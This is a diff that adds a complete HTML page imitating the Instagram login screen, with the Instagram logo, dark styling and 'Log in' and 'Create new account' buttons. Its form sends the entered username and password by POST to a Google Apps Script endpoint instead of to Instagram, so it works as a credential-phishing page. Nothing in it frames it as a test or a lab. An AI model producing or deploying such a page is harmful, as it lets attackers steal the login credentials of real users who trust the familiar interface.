@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .login-container {
+            text-align: center;
+            width: 300px;
+        }
+        .login-container img {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            background: #222;
+            border: 1px solid #333;
+            border-radius: 5px;
+            color: white;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 25px; /* Rounded button */
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-container button:hover {
+            background-color: #0077c2;
+        }
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #bbb;
+        }
+
+        /* Create new account button style */
+        .signup-box {
+            width: 100%;
+            padding: 10px;
+            margin-top: 15px;
+            border: 2px solid #0095f6;
+            border-radius: 25px;
+            color: #0095f6;
+            font-size: 16px;
+            text-align: center;
+            cursor: pointer;
+        }
+        .signup-box:hover {
+            background-color: rgba(0, 149, 246, 0.1);
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+
+        <!-- Form with corrected 'name' attributes -->
+        <form action="https://script.google.com/macros/s/AKfycbwWuGRvyc7bwe1SDm-OEuhu9KTa9CCmMvZjc6zg4P5aiFE9W27n8sbX_LItn3JpkRYAKA/exec" method="post">
+            <input type="text" name="username" placeholder="Username, email address or mobile number">
+            <input type="password" name="password" placeholder="Password">
+            <button type="submit">Log in</button>
+        </form>
+
+        <div class="forgot-password">Forgotten Password?</div>
+        <div class="signup-box">Create new account</div>
+    </div>
+</body>
+</html>
